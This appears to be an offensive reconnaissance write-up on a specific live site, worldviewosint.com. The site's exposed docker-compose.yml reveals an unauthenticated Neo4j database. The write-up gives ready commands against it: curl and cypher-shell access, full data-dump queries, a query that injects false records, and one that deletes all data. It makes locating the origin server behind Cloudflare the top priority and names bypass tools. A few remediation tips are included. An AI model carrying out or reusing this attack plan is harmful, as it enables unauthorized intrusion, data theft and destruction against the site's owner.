# CRITICAL: Docker Compose Configuration Exposed

**Date:** 2026-05-21
**Severity:** CRITICAL
**Path:** `https://worldviewosint.com/docker-compose.yml`

---

## Discovery

During directory brute-force testing (133 paths), `/docker-compose.yml` returned a **367-byte YAML file** — a real configuration file, not the SPA catch-all HTML.

## Exposed Configuration

```yaml
version: '3.8'

services:
  worldview:
    build: .
    container_name: worldview-osint
    command: ts-node src/server.rugged.ts
    ports:
      - "3000:3000"
    restart: always
    env_file: .env

  neo4j:
    image: neo4j:5-community
    container_name: worldview-neo4j
    ports:
      - "7474:7474"
      - "7687:7687"
    environment:
      - NEO4J_AUTH=none
```

## Intelligence Extracted

### Backend Architecture

| Field | Value |
|-------|-------|
| Runtime | TypeScript (ts-node) |
| Entry point | `src/server.rugged.ts` |
| Container | `worldview-osint` |
| Internal port | 3000 |
| Restart policy | always |
| Secrets | `.env` file (not exposed) |

**Key insight:** The backend is TypeScript, not plain JavaScript. The entry point `server.rugged.ts` suggests a hardened/production server variant (possibly named after a "rugged" design philosophy).

### Database

| Field | Value |
|-------|-------|
| Type | **Neo4j 5 Community Edition** (graph database) |
| Container | `worldview-neo4j` |
| HTTP Browser | Port 7474 |
| Bolt Protocol | Port 7687 |
| Authentication | **NONE** (`NEO4J_AUTH=none`) |

**CRITICAL:** Neo4j is running with **no authentication**. If the origin server IP is discovered, anyone can:
1. Access the Neo4j browser interface on port 7474
2. Execute Cypher queries via Bolt protocol on port 7687
3. Read ALL graph data (conflicts, vessels, aircraft, relationships)
4. Write/delete data with no restrictions
5. Potentially execute server-side procedures

### Why Neo4j for OSINT?

Graph databases excel at relationship mapping — exactly what an OSINT platform needs:
- Vessel → Port → Country relationships
- Aircraft → Base → Mission type graphs
- Conflict zone → Participant → Equipment chains
- Developer could be modeling intelligence relationships that the flat JSON API doesn't expose

This means the **server-side data model is far richer than what the API returns**. The API serves flat JSON arrays, but the underlying database stores interconnected intelligence graphs.

## Attack Vectors (if origin IP is found)

### 1. Direct Neo4j Access
```
# Browser interface
http://<ORIGIN_IP>:7474/browser/

# Cypher query via HTTP
curl http://<ORIGIN_IP>:7474/db/neo4j/tx/commit \
  -H "Content-Type: application/json" \
  -d '{"statements":[{"statement":"MATCH (n) RETURN labels(n), count(n)"}]}'

# Bolt protocol
cypher-shell -a bolt://<ORIGIN_IP>:7687 "MATCH (n) RETURN n LIMIT 10"
```

### 2. Data Exfiltration
```cypher
-- Dump all node types and counts
MATCH (n) RETURN labels(n) AS type, count(n) AS count ORDER BY count DESC

-- Dump all relationships
MATCH ()-[r]->() RETURN type(r), count(r) ORDER BY count(r) DESC

-- Full data export
CALL apoc.export.json.all("dump.json", {useTypes: true})
```

### 3. Data Manipulation
```cypher
-- Inject false intelligence
CREATE (c:Conflict {name: "FAKE", lat: 0, lon: 0, intensity: "CRITICAL"})

-- Delete all data
MATCH (n) DETACH DELETE n
```

## Immediate Implications

1. **Stack confirmed:** TypeScript + Neo4j (not MongoDB as commonly assumed for Node.js apps)
2. **No DB auth:** If origin IP leaks, database is fully open
3. **Origin IP = total compromise:** Finding the real IP now grants full database access, not just API scraping
4. **The API is a thin layer:** The graph database likely contains much more intelligence than the REST API exposes
5. **Ports 3000, 7474, 7687 are targets:** If the origin IP is found, these ports should be probed immediately

## Recommendations (for the developer)

1. **Immediately remove** `/docker-compose.yml` from the web root
2. Set `NEO4J_AUTH=neo4j/strong-password` in the compose file
3. Remove Neo4j port bindings (use Docker internal networking only)
4. Add `NEO4J_AUTH` to `.env` instead of hardcoding
5. Use `.dockerignore` to prevent `docker-compose.yml` from being served

## Updated Priority

Finding the origin server IP is now the **#1 priority**. It was already high-value, but the exposed Neo4j with no auth makes it a total compromise scenario. Tools to pursue:

- **CloakQuest3r** — DNS history + SSL analysis for Cloudflare bypass
- **Shodan/Censys** — Search for `neo4j` on port 7474 with SSL cert matching worldviewosint.com
- **Historical DNS** — The domain is only ~2 months old, origin IP may have been briefly exposed
